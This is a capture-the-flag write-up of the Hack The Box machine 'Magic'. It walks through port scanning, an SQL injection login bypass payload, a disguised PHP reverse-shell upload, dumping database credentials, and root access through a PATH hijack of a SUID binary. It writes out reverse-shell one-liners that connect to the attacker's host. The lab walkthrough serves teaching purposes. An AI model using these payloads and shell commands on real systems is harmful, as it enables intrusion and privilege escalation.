---
title: "HTB Magic Writeup"
date: 2022-03-27T00:51:33+05:30
tags: ['Medium', 'Linux', 'Retired']
categories: ['Linux Medium']
draft: false
---
# 1. Process
*	Carried out port scanning and found two open ports running HTTP server and SSH server.
*	Checked out webpage of HTTP server running on tcp/80
*	The login page was vulnerable to SQL injection
*	On successful login, user was redirected to an upload page
*	Here, uploaded a php reverse shell by altering the extension and magic number
*	Gained reverse shell as root
*	Examined the web applicataion's file and found mysql credentials
*	mysql binary was not present. Used `mysqldump` instead
	*	Could have also used a chisel binary by first uploading it to the victim and then tunnel using it to `127.0.0.1:3306`
*	Thus, got user's credential from the database dump
*	Used them to login as used
*	Searched for SUID's. Found an interesting SUID
*	Examined it using strings and found other binaries were being called without specifing absolute path.
*	Thus exploited it by creating malicious binaries and altering `$PATH` variable
*	Got shell as root.

## 1. Enumeration
### 1.1 Port Scanning
*	`22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3`
*	`80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))`
#### 1.1.1 Nmap (Aggressive, Top 1000 ports)
```bash
┌─[babayaga@babayaga-virtualbox]─[~/Desktop/HTB/Linux/Magic/nmap]
└──╼ $sudo nmap -A -sC 10.129.94.197 -T4 -oN magic.AsCdeault
[sudo] password for babayaga: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-05 16:36 IST
Nmap scan report for magic.htb (10.129.94.197)
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=6/5%OT=22%CT=1%CU=44144%PV=Y%DS=2%DC=T%G=Y%TM=629C8E52
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(S
OS:P=100%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=
OS:M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=FE
OS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7
OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   237.40 ms 10.10.14.1
2   188.64 ms magic.htb (10.129.94.197)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.03 seconds
```


### 1.2 Whatweb
```bash
─[babayaga@babayaga-virtualbox]─[~]
└──╼ $whatweb magic.htb
http://magic.htb [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.129.94.197], JQuery, Script, Title[Magic Portfolio]
```

### 1.3 Vulnerabilities
#### SSH
```bash
┌─[babayaga@babayaga-virtualbox]─[~]
└──╼ $searchsploit ssh 7.6
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
LibSSH 0.7.6 / 0.8.4 - Unauthorized Access    | linux/remote/46307.py
OpenSSH 2.3 < 7.7 - Username Enumeration      | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC | linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2)          | linux/remote/45939.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```


## 2. HTTP Webservice 

### 2.1 Webpage
{{< figure src="/images/MagicPic/webpage.png" title="Webpage at http://magic.htb" >}}

### 2.2 Directory Enumeration
Bruteforced subdirectories using gobuster to find more content for analysis and understand the structure of the application.
```bash
┌─[babayaga@babayaga-virtualbox]─[~/Desktop/HTB/Linux/Magic/enum]
└──╼ $cat magic.common.txt 
/.sh_history          (Status: 403) [Size: 274]
/.sh_history.php      (Status: 403) [Size: 274]
/.sh_history.txt      (Status: 403) [Size: 274]
/.sh_history.html     (Status: 403) [Size: 274]
/.htaccess            (Status: 403) [Size: 274]
/.hta.html            (Status: 403) [Size: 274]
/.htaccess.php        (Status: 403) [Size: 274]
/.hta                 (Status: 403) [Size: 274]
/.hta.php             (Status: 403) [Size: 274]
/.htaccess.txt        (Status: 403) [Size: 274]
/.htaccess.html       (Status: 403) [Size: 274]
/.hta.txt             (Status: 403) [Size: 274]
/assets               (Status: 301) [Size: 307] [--> http://magic.htb/assets/]
/images               (Status: 301) [Size: 307] [--> http://magic.htb/images/]
/index.php            (Status: 200) [Size: 4052]
/index.php            (Status: 200) [Size: 4053]
/login.php            (Status: 200) [Size: 4221]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/server-status        (Status: 403) [Size: 274]
/upload.php           (Status: 302) [Size: 2957] [--> login.php]
```

### 2.3 Vulnerability
Space was not accepted in the form as valid character thus use the `/* */` comment as valid delimiter and got a 302 request.
SQL Injection Payload: `username=admin&password=admin'OR/**/'1'='1` 
{{< figure src="/images/MagicPic/sqlreq-comment.png" title="Authentication Bypass using SQL Injection" >}}

Followed Redirection: 
{{< figure src="/images/MagicPic/follow-redirection.png" title="Redirected to `/upload.php`" >}}


### 2.4 Establishing Foothold via Image Upload
It is pentest monkey's reverse shell. Altered the extension and edited the magic number using hexedit as only image file were allowed through the filter.
{{< figure src="/images/MagicPic/file-upload.png" title="Uploading Reverse Shell" >}}

Triggered payload and got reverse shell. Inspecting source code revealed the destination where uploaded content was saved. Thus, used a GET request to trigger its execution on server's side.
{{< figure src="/images/MagicPic/reverse-shell.png" title="Reverse Shell" >}}


## 3. Privilege Escalation (Horizontal and Vertical)

### 3.1 Enumerating File System
Found credentials to a mysql database in `db.php5`. Database: `Magic`, Host: `localhost`, Username: `theseus` and Password: `iamkingtheseus`
```bash
www-data@ubuntu:/var/www/Magic$ ls
total 52
drwxr-xr-x 4 www-data www-data 4096 Jul 12  2021 .
drwxr-xr-x 4 root     root     4096 Jul  6  2021 ..
-rwx---r-x 1 www-data www-data  162 Oct 18  2019 .htaccess
drwxrwxr-x 6 www-data www-data 4096 Jul  6  2021 assets
-rw-r--r-- 1 www-data www-data  881 Oct 16  2019 db.php5
drwxr-xr-x 4 www-data www-data 4096 Jul  6  2021 images
-rw-rw-r-- 1 www-data www-data 4528 Oct 22  2019 index.php
-rw-r--r-- 1 www-data www-data 5539 Oct 22  2019 login.php
-rw-r--r-- 1 www-data www-data   72 Oct 18  2019 logout.php
-rw-r--r-- 1 www-data www-data 4520 Oct 22  2019 upload.php
```
```php
www-data@ubuntu:/var/www/Magic$ cat db.php5 
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}
www-data@ubuntu:/var/www/Magic$ 

```

Checked the networks this interface was connected to and service runing on various interfaces

```bash
www-data@ubuntu:/var/www/Magic$ ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.94.197  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:fe96:79cd  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:fe96:79cd  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:96:79:cd  txqueuelen 1000  (Ethernet)
        RX packets 1239681  bytes 196716739 (196.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1085118  bytes 477803180 (477.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 15852  bytes 1307489 (1.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 15852  bytes 1307489 (1.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

www-data@ubuntu:/var/www/Magic$ netstat -antp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      2 10.129.94.197:37080     10.10.14.53:1234        ESTABLISHED 2734/sh             
tcp        0      1 10.129.94.197:44996     8.8.8.8:53              SYN_SENT    -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 10.129.94.197:80        10.10.14.53:46644       ESTABLISHED - 
```

Tried logging in mysql database using `mysql` command but it was not installed on system. Tried following: 
	*	Port Forwarding: Didn't work
	*	Installing binary: Didn't work
	*	Working with other mysql binaries
	*	Tried interacting with `db.php5`
	
Creds: `admin:Th3s3usW4sK1ng`
```bash
www-data@ubuntu:/usr/bin$ mysqldump -h localhost -u theseus -piamkingtheseus
mysqldump: [Warning] Using a password on the command line interface can be insecure.
Usage: mysqldump [OPTIONS] database [tables]
OR     mysqldump [OPTIONS] --databases [OPTIONS] DB1 [DB2 DB3...]
OR     mysqldump [OPTIONS] --all-databases [OPTIONS]
For more options, use mysqldump --help
icw-data@ubuntu:/usr/bin$ mysqldump -h localhost -u theseus -piamkingtheseus Mag 
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version	5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2022-06-05  8:47:33

```

### 3.2 Logged in as Theseus
Used password: `Th3s3usW4sK1ng`
```bash
www-data@ubuntu:/usr/bin$ su theseus
Password: 
theseus@ubuntu:/usr/bin$ whoami
theseus



theseus@ubuntu:~$ cat user.txt 
e342a54e2551f77eb5cf3fbdcdf9aff3

```


### 3.3 SUID
Transferred the `linpeas.sh` to the host and executed it. Found an interesting binary `sysinfo`.
```bash
-rwsr-xr-x 1 root root 27K Jan  8  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-x--- 1 root users 22K Oct 21  2019 /bin/sysinfo (Unknown SUID binary)
-rwsr-xr-x 1 root root 43K Jan  8  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
```

Tried reading `sysinfo` but got gibberish as it was a compiled C program. Thus used `strings` to find some useful text. `ltrace` could also have been used.
```bash
popen() failed!
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
free -h
;*3$"
```

Now an SUID `sysinfo` was excuting many command like free. When an SUID runs it runs with privileges of its owner. Thus any command that will be executed will be executed with the privileges or root. 

I leveraged it my creating a modified binary and altering the `$PATH` variable. So when binary `free` was executed by the command it would be first searched in the folder where malicious bianary is present.

```bash
theseus@ubuntu:/bin$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
theseus@ubuntu:/bin$ export PATH=$PATH:/tmp
theseus@ubuntu:/bin$ cd /tmp
theseus@ubuntu:/tmp$ ls
total 756
drwxrwxrwt  2 root    root      4096 Jun  5 09:04 .
drwxr-xr-x 24 root    root      4096 Jul  6  2021 ..
-rwxrwxr-x  1 theseus theseus 764159 Feb 13 11:44 linpeas.sh
theseus@ubuntu:/tmp$ echo "/bin/bash -p" > free
theseus@ubuntu:/tmp$ export PATH=/tmp:$PATH
theseus@ubuntu:/tmp$ chmod +x free 
theseus@ubuntu:/tmp$ ls
total 760
drwxrwxrwt  2 root    root      4096 Jun  5 09:11 .
drwxr-xr-x 24 root    root      4096 Jul  6  2021 ..
-rwxrwxr-x  1 theseus theseus     13 Jun  5 09:08 free
-rwxrwxr-x  1 theseus theseus 764159 Feb 13 11:44 linpeas.sh

```

Got shell as root but the only problem was that output was not visible. Thus, started a netcat listner on my machine and executed the reverse shell payload on the other.
```bash
theseus@ubuntu:/tmp$ sysinfo
====================Hardware Info====================
H/W path           Device     Class      Description
====================================================
                              system     VMware Virtual Platform
/0                            bus        440BX Desktop Reference Platform
/0/0                          memory     86KiB BIOS
/0/1                          processor  Intel(R) Xeon(R) Gold 5218 CPU @ 2.30GHz
/0/1/0                        memory     16KiB L1 cache
/0/1/1                        memory     16KiB L1 cache

... 
...
...

====================MEM Usage=====================
root@ubuntu:/tmp# whoami
root@ubuntu:/tmp# ls
root@ubuntu:/tmp# ls
root@ubuntu:/tmp# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.53 4343 >/tmp/f
rm: cannot remove '/tmp/f': No such file or directory

Command 'nc' not found, but can be installed with:

apt install netcat-openbsd    
apt install netcat-traditional

root@ubuntu:/tmp# ls
root@ubuntu:/tmp# bash -i >& /dev/tcp/10.10.14.53/4343 0>&1
```

Reverse Shell as root received.
```bash
┌─[babayaga@babayaga-virtualbox]─[~]
└──╼ $nc -lvnp 4343
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4343
Ncat: Listening on 0.0.0.0:4343
Ncat: Connection from 10.129.94.197.
Ncat: Connection from 10.129.94.197:56288.
root@ubuntu:/tmp# ls
ls
f
free
linpeas.sh
root@ubuntu:/tmp# cd /root
cd /root
root@ubuntu:/root# ls
ls
info.c
root.txt
snap
root@ubuntu:/root# cat root.txt
cat root.txt
e5cb98f0673ee821bcc7dc982ac670a4
```
